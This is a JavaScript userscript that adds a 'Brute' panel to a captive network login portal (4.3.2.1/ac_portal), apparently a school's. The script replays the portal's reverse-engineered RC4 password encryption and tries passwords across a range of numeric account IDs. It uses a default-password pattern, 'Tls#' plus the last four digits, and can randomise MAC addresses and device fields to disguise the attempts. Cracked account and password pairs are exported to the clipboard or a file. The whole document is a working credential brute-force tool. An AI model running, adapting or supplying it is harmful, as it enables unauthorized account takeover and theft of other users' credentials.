// ==UserScript==
// @name         tsinglan_network_acportalbrute
// @namespace    http://tampermonkey.net/
// @version      1.3
// @description  测试账号密码暴力登录
// @author       Nytsai
// @match        http://4.3.2.1/*
// @updateURL    https://github.com/ShihanWu1029/tsinglan_network_acportalbrute/raw/refs/heads/main/main.user.js
// @installURL   https://github.com/ShihanWu1029/tsinglan_network_acportalbrute/raw/refs/heads/main/main.user.js
// ==/UserScript==

(function() {
    'use strict';

/*************************Back-End Logic:*******************************/
    // RC4加密函数
    // 校宝代码逆向抓下来的
    function do_encrypt_rc4(src, passwd) {
        src = src.trim(src+'');
        passwd = passwd + '';
        var i, j = 0, a = 0, b = 0, c = 0, temp;
        var plen = passwd.length,
            size = src.length;

        var key = Array(256); //int
        var sbox = Array(256); //int
        var output = Array(size); //code of data
        for (i = 0; i < 256; i++) {
            key[i] = passwd.charCodeAt(i % plen);
            sbox[i] = i;
        }
        for (i = 0; i < 256; i++) {
            j = (j + sbox[i] + key[i]) % 256;
            temp = sbox[i];
            sbox[i] = sbox[j];
            sbox[j] = temp;
        }
        for (i = 0; i < size; i++) {
            a = (a + 1) % 256;
            b = (b + sbox[a]) % 256;
            temp = sbox[a];
            sbox[a] = sbox[b];
            sbox[b] = temp;
            c = (sbox[a] + sbox[b]) % 256;
            temp = src.charCodeAt(i) ^ sbox[c];//String.fromCharCode(src.charCodeAt(i) ^ sbox[c]);
            temp = temp.toString(16);
            if (temp.length === 1) {
                temp = '0' + temp;
            } else if (temp.length === 0) {
                temp = '00';
            }
            output[i] = temp;
        }
        return output.join('');
    }

    // 新增：生成随机 MAC 地址的助手（格式：aa-bb-cc-dd-ee-ff）
    function randomMac() {
        // produce MAC in lower-case hex pairs separated by '-'
        const hex = '0123456789abcdef';
        const parts = [];
        for (let i = 0; i < 6; i++) {
            const a = hex[Math.floor(Math.random() * 16)];
            const b = hex[Math.floor(Math.random() * 16)];
            parts.push(a + b);
        }
        return parts.join('-');
    }

    // 暴力测试模块
    const Brute = {
        // reuse existing RC4 impl
        do_encrypt_rc4: do_encrypt_rc4,

        // internal map to store successful account -> password (not shown in UI)
        _success: {},

        // 测试单个账号
        async testAccount(account, password) {
            // 获取是否启用随机化（优先从 localStorage 读取，若 UI 存在也会写入该值）
            let randomize = false;
            try {
                randomize = localStorage.getItem('pt_randomize') === '1';
            } catch (e) {}

            // 如果 UI 已经渲染且元素存在，也可以直接读取（不过 localStorage 为主）
            try {
                const el = document.getElementById('randomizeInfo');
                if (el) randomize = el.checked;
            } catch (e) {}

            const rckey = +(new Date()) + 100 + ''; // 校宝加密逻辑，也是代码逆向下来的
            const encryptedPwd = Brute.do_encrypt_rc4(password, rckey);

            // 如果启用随机化，则构建随机 mac 与伪造的个人信息字段并附加到 referrer 和 POST body
            let mac = 'ce-e4-5c-36-3e-c7'; // 默认原始 mac 保持不变
            let device = 'ce-e4-5c-36-3e-c7'; // 占位
            let controller_type_val = '';
            if (randomize) {
                mac = randomMac();
                // 伪造其他个人信息字段（简单示例），你可以按需扩展
                device = 'Device-' + Math.random().toString(36).slice(2,8);
                controller_type_val = 'pc';
            }

            // 构造 referrer（保留原样结构，仅替换 mac 部分）
            const baseRef = 'http://4.3.2.1/ac_portal/20210314173759/pc.html?template=20210314173759&tabs=pwd-dingtalk&vlanid=0&_ID_=0&switch_url=&url=http://4.3.2.1/homepage/index.html&controller_type=';
            const referrer = `${baseRef}${encodeURIComponent(controller_type_val)}&mac=${encodeURIComponent(mac)}`;

            // 构造 POST body，保留原字段并附加 mac/device/controller_type 字段（服务器若忽略则不会影响）
            const body = `opr=pwdLogin&userName=${account}&pwd=${encryptedPwd}&auth_tag=${rckey}&rememberPwd=0&mac=${encodeURIComponent(mac)}&device=${encodeURIComponent(device)}&controller_type=${encodeURIComponent(controller_type_val)}`;

            const response = await fetch("http://4.3.2.1/ac_portal/login.php", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5,ja;q=0.4",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest"
                },
                // 使用动态 referrer（含随机 mac）以模拟不同设备来源
                "referrer": referrer,
                "body": body,
                "method": "POST",
                "mode": "cors",
                "credentials": "include"
            });

            return response;
        },

        // 主测试函数
        async startTesting() {
            const startAccount = parseInt(document.getElementById('startAccount').value);
            const endAccount = parseInt(document.getElementById('endAccount').value);
            const testPassword = document.getElementById('testPassword').value;

            if (isNaN(startAccount) || isNaN(endAccount)) {
                alert('Please enter a valid account range');
                return;
            }

            document.getElementById('testStatus').textContent = 'Testing...';
            document.getElementById('startTest').disabled = true;

            // reset internal success map for new run
            Brute._success = {};
            const successAccounts = [];

            for (let i = startAccount; i <= endAccount; i++) {
                if (window.stopTesting) break;

                const account = i.toString();
                document.getElementById('currentAccount').textContent = account;

                try {
                    // 尝试的密码列表：用户输入的密码，和自动生成的 Tls# 后四位
                    const secondaryPwd = `Tls#${account.slice(-4)}`;
                    const tryPwds = [testPassword, secondaryPwd];

                    let succeeded = false;
                    for (const pwd of tryPwds) {
                        if (window.stopTesting) break;

                        const response = await Brute.testAccount(account, pwd);
                        const responseText = await response.text();

                        if (response.status === 200) {
                            console.log(`Account "${account}" tried pwd "${pwd}". Status: ${response.status}. Response: ${responseText}`);

                            if (!responseText.includes('false')) {
                                if (!successAccounts.includes(account)) {
                                    successAccounts.push(account);
                                    // update UI list (accounts only)
                                    document.getElementById('successAccounts').textContent = successAccounts.join(', ');
                                    // record password in internal map for export
                                    Brute._success[account] = pwd;
                                }
                                console.log(`Login Succeed: ${account} using password "${pwd}"`);
                                succeeded = true;
                                break; // 成功则跳出当前账号的密码尝试
                            }
                        } else {
                            console.log(`Account ${account} login attempt returned status ${response.status} for pwd "${pwd}"`);
                        }
                    }
                    if (!succeeded) {
                        console.log(`Account ${account} all password attempts failed`);
                    }
                } catch (error) {
                    console.error(`Account ${account} occur an unexpected error`, error);
                }

                // 使用面板设置的延迟（默认2000ms）
                let delay = 2000;
                try {
                    const v = parseInt(document.getElementById('delayMs').value);
                    if (!isNaN(v) && v >= 0) delay = v;
                } catch (e) {}
                await new Promise(resolve => setTimeout(resolve, delay));
            }

            document.getElementById('testStatus').textContent = 'Completed';
            document.getElementById('startTest').disabled = false;
            document.getElementById('currentAccount').textContent = '-';
        }
    }

/*************************Font-End UI:*******************************/

    // 创建测试界面（修改：面板更大，更美观，保留开关/关闭逻辑）
    function createTestInterface() {
        // 小开关按钮（默认可见）
        const toggleBtn = document.createElement('button');
        toggleBtn.id = 'testerToggleBtn';
        toggleBtn.title = 'Open';
        toggleBtn.innerHTML = 'Brute';
        toggleBtn.style.cssText = `
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: linear-gradient(135deg,#06b6d4,#0891b2);
            color: white;
            border: none;
            box-shadow: 0 8px 26px rgba(2,6,23,0.28);
            z-index: 10000;
            cursor: pointer;
            font-weight: 700;
            font-size: 13px;
            transition: transform .16s ease, box-shadow .16s ease, background .18s ease;
        `;
        toggleBtn.onmouseenter = () => {
            toggleBtn.style.transform = 'translateY(-4px)';
            toggleBtn.style.boxShadow = '0 12px 34px rgba(2,6,23,0.32)';
        };
        toggleBtn.onmouseleave = () => {
            toggleBtn.style.transform = 'translateY(0)';
            toggleBtn.style.boxShadow = '0 8px 26px rgba(2,6,23,0.28)';
        };

        // 主面板（初始隐藏，扩大宽度）
        const interfaceDiv = document.createElement('div');
        interfaceDiv.id = 'password-tester';
        interfaceDiv.style.cssText = `
            position: fixed;
            bottom: 100px;
            right: 24px;
            width: 520px;
            max-width: calc(100% - 48px);
            background: linear-gradient(180deg,#ffffff,#fbfdff);
            border: 1px solid rgba(12,14,20,0.06);
            border-radius: 14px;
            padding: 18px;
            z-index: 10000;
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
            box-shadow: 0 18px 48px rgba(2,6,23,0.18);
            display: none;
            transition: transform .24s ease, opacity .24s ease;
            transform-origin: right bottom;
        `;

        interfaceDiv.innerHTML = `
            <style>
                /* scoped styles for the panel */
                #password-tester .pt-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;cursor:grab;}
                #password-tester .pt-title{margin:0;font-size:16px;color:#0b1220;font-weight:700;}
                #password-tester .pt-close{background:transparent;border:1px solid transparent;padding:6px 8px;border-radius:8px;cursor:pointer;color:#64748b;transition:all .14s ease;}
                #password-tester .pt-close:hover{background:rgba(15,23,42,0.04);color:#0b1220;border-color:rgba(15,23,42,0.04);}
                #password-tester .pt-row{display:flex;gap:10px;margin-bottom:10px;}
                #password-tester label{flex:1;font-size:13px;color:#334155;}
                #password-tester input[type="text"], #password-tester input[type="number"]{width:100%;margin-top:6px;padding:8px;border-radius:8px;border:1px solid #e6eef6;background:#fbfdff;box-sizing:border-box;transition:box-shadow .12s ease,border-color .12s ease;}
                #password-tester input[type="text"]:focus, #password-tester input[type="number"]:focus{outline:none;border-color:#93c5fd;box-shadow:0 6px 20px rgba(37,99,235,0.08);}
                #password-tester .pt-actions{display:flex;gap:10px;margin-bottom:12px;}
                #password-tester .btn{flex:1;padding:10px;border-radius:10px;border:none;cursor:pointer;font-weight:700;transition:transform .12s ease,box-shadow .12s ease;}
                #password-tester .btn-start{background:linear-gradient(90deg,#06b6d4,#0891b2);color:white;}
                #password-tester .btn-start:hover{transform:translateY(-3px);box-shadow:0 10px 28px rgba(6,182,212,0.16);}
                #password-tester .btn-stop{background:linear-gradient(90deg,#ef4444,#dc2626);color:white;}
                #password-tester .pt-info{font-size:13px;color:#334155;line-height:1.45;}
                #password-tester .pt-info div{margin-bottom:6px;}
                #password-tester .success-list{display:inline-block;max-width:100%;word-break:break-all;color:#059669;font-weight:600;}
                #password-tester .pt-footer{display:flex;gap:8px;margin-top:10px;align-items:center;justify-content:space-between;}
                #password-tester .small{font-size:12px;color:#64748b;}
                #password-tester .ctrl-btn{padding:8px 10px;border-radius:8px;border:1px solid rgba(12,14,20,0.06);background:#fff;cursor:pointer;}
            </style>

            <div class="pt-header" id="ptHeader">
                <h3 class="pt-title">AcPortal_Brute</h3>
                <div>
                    <button id="closeTestPanel" class="pt-close" title="Close">✕</button>
                </div>
            </div>

            <div class="pt-row">
                <label>Start Account:<input id="startAccount" value="" type="text"></label>
                <label>End Account:<input id="endAccount" value="" type="text"></label>
            </div>

            <div style="margin-bottom:12px;">
                <label>Password:<input id="testPassword" value="123456" type="text"></label>
            </div>

            <div class="pt-row" style="margin-bottom:10px;">
                <label>Delay (ms):<input id="delayMs" value="2000" type="number" min="0"></label>
                <label style="display:flex;align-items:center;gap:8px;"><input id="autoOpen" type="checkbox"> Auto open next time</label>
                <!-- 新增：随机化开关 -->
                <label style="display:flex;align-items:center;gap:8px;"><input id="randomizeInfo" type="checkbox"> Randomize MAC & Info</label>
            </div>

            <div class="pt-actions">
                <button id="startTest" class="btn btn-start">Start</button>
                <button id="stopTest" class="btn btn-stop">Stop</button>
            </div>

            <div class="pt-info">
                <div>Current account: <span id="currentAccount">-</span></div>
                <div>Status: <span id="testStatus">Waiting</span></div>
                <div>Successful accounts: <span id="successAccounts" class="success-list">-</span></div>
            </div>

            <div class="pt-footer">
                <div style="display:flex;gap:8px;">
                    <button id="exportSuccess" class="ctrl-btn small">Export</button>
                    <button id="clearSuccess" class="ctrl-btn small">Clear</button>
                </div>
                <div class="small">Shortcut: Ctrl+Shift+T</div>
            </div>
        `;

        document.body.appendChild(toggleBtn);
        document.body.appendChild(interfaceDiv);

        // 恢复位置与设置
        try {
            const storedPos = localStorage.getItem('pt_pos');
            if (storedPos) {
                const p = JSON.parse(storedPos);
                interfaceDiv.style.right = 'auto';
                interfaceDiv.style.left = p.left + 'px';
                interfaceDiv.style.top = p.top + 'px';
                interfaceDiv.style.bottom = 'auto';
            }
            const storedDelay = localStorage.getItem('pt_delay');
            if (storedDelay) document.getElementById('delayMs').value = storedDelay;
            const storedAuto = localStorage.getItem('pt_autoOpen');
            if (storedAuto === '1') document.getElementById('autoOpen').checked = true;

            // 恢复随机化设置
            const storedRandom = localStorage.getItem('pt_randomize');
            if (storedRandom === '1') {
                const el = document.getElementById('randomizeInfo');
                if (el) el.checked = true;
            }
        } catch(e) { /* ignore */ }

        // 切换显示逻辑（保留动画）
        function openPanel() {
            interfaceDiv.style.display = 'block';
            // 初始动画状态
            interfaceDiv.style.opacity = '0';
            interfaceDiv.style.transform = 'translateY(8px) scale(.98)';
            requestAnimationFrame(() => {
                interfaceDiv.style.opacity = '1';
                interfaceDiv.style.transform = 'translateY(0) scale(1)';
            });
            toggleBtn.style.display = 'none';
        }
        function closePanel() {
            interfaceDiv.style.opacity = '0';
            interfaceDiv.style.transform = 'translateY(8px) scale(.98)';
            setTimeout(() => {
                interfaceDiv.style.display = 'none';
                toggleBtn.style.display = 'block';
            }, 220);
        }

        toggleBtn.addEventListener('click', openPanel);
        interfaceDiv.querySelector('#closeTestPanel').addEventListener('click', closePanel);

        // 拖拽逻辑（按标题拖动）
        (function enableDrag() {
            const header = document.getElementById('ptHeader');
            let dragging = false, startX=0, startY=0, startLeft=0, startTop=0;
            header.addEventListener('mousedown', (e) => {
                dragging = true;
                header.style.cursor = 'grabbing';
                startX = e.clientX;
                startY = e.clientY;
                const rect = interfaceDiv.getBoundingClientRect();
                startLeft = rect.left;
                startTop = rect.top;
                e.preventDefault();
            });
            document.addEventListener('mousemove', (e) => {
                if (!dragging) return;
                let dx = e.clientX - startX;
                let dy = e.clientY - startY;
                let newLeft = Math.max(8, startLeft + dx);
                let newTop = Math.max(8, startTop + dy);
                interfaceDiv.style.left = newLeft + 'px';
                interfaceDiv.style.top = newTop + 'px';
                interfaceDiv.style.right = 'auto';
                interfaceDiv.style.bottom = 'auto';
            });
            document.addEventListener('mouseup', () => {
                if (!dragging) return;
                dragging = false;
                header.style.cursor = 'grab';
                // 存储位置
                const rect = interfaceDiv.getBoundingClientRect();
                localStorage.setItem('pt_pos', JSON.stringify({left: Math.round(rect.left), top: Math.round(rect.top)}));
            });
        })();

        // 自动展开逻辑与设置持久化
        const autoOpenEl = document.getElementById('autoOpen');
        autoOpenEl.addEventListener('change', () => {
            localStorage.setItem('pt_autoOpen', autoOpenEl.checked ? '1' : '0');
        });
        document.getElementById('delayMs').addEventListener('change', (e) => {
            localStorage.setItem('pt_delay', e.target.value);
        });

        // 新增：随机化开关持久化
        const randomizeEl = document.getElementById('randomizeInfo');
        if (randomizeEl) {
            randomizeEl.addEventListener('change', () => {
                localStorage.setItem('pt_randomize', randomizeEl.checked ? '1' : '0');
            });
        }

        // 导出与清空（替换原有导出/清空处理）
        document.getElementById('exportSuccess').addEventListener('click', () => {
            // Build export text from internal map (account,password per line)
            const map = Brute._success || {};
            const keys = Object.keys(map);
            if (!keys.length) {
                alert('No successful accounts to export');
                return;
            }
            // 构造每行 "account,password"
            const lines = keys.map(k => `${k},${map[k]}`);
            const txt = lines.join('\n');

            // 弹窗让用户选择：确定=复制，取消=下载文件
            const doCopy = confirm('Click OK to copy to clipboard, Cancel to download as file');
            if (doCopy) {
                // 复制到剪贴板
                navigator.clipboard?.writeText(txt).then(() => {
                    alert('Copied successful accounts to clipboard');
                }).catch(() => {
                    // fallback: 创建临时 textarea
                    const ta = document.createElement('textarea');
                    ta.value = txt;
                    document.body.appendChild(ta);
                    ta.select();
                    try { document.execCommand('copy'); alert('Copied successful accounts to clipboard'); } catch(e){ alert('Copy failed'); }
                    ta.remove();
                });
                return;
            }

            // 下载文件
            const blob = new Blob([txt], {type:'text/plain;charset=utf-8'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'success_accounts_with_passwords.txt';
            document.body.appendChild(a);
            a.click();
            a.remove();
            URL.revokeObjectURL(url);
            alert('Downloaded successful accounts file');
        });

        document.getElementById('clearSuccess').addEventListener('click', () => {
            document.getElementById('successAccounts').textContent = '-';
            // clear internal map as well
            Brute._success = {};
        });

        // 快捷键 Ctrl+Shift+T 切换
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 't') {
                if (interfaceDiv.style.display === 'block') closePanel(); else openPanel();
            }
        });

        // 打开面板如果用户设置了自动展开
        try {
            if (localStorage.getItem('pt_autoOpen') === '1') {
                openPanel();
            }
        } catch(e){/* ignore */}
    }

    // 初始化
    window.stopTesting = false;

    createTestInterface();

    // 重新绑定开始/停止按钮（因为面板可能是动态创建的）
    (function bindButtons() {
        // 等待元素可用
        const startBtn = document.getElementById('startTest');
        const stopBtn = document.getElementById('stopTest');
        // 如果面板还未打开，按钮可能存在但被隐藏；直接绑定即可
        if (startBtn) {
            startBtn.addEventListener('click', () => {
                window.stopTesting = false;
                document.getElementById('testStatus').textContent = 'Testing...';
                Brute.startTesting(); // 调用新的逻辑模块
            });
        }
        if (stopBtn) {
            stopBtn.addEventListener('click', () => {
                window.stopTesting = true;
                const statusEl = document.getElementById('testStatus');
                if (statusEl) statusEl.textContent = 'Stopped';
            });
        }
    })();

})();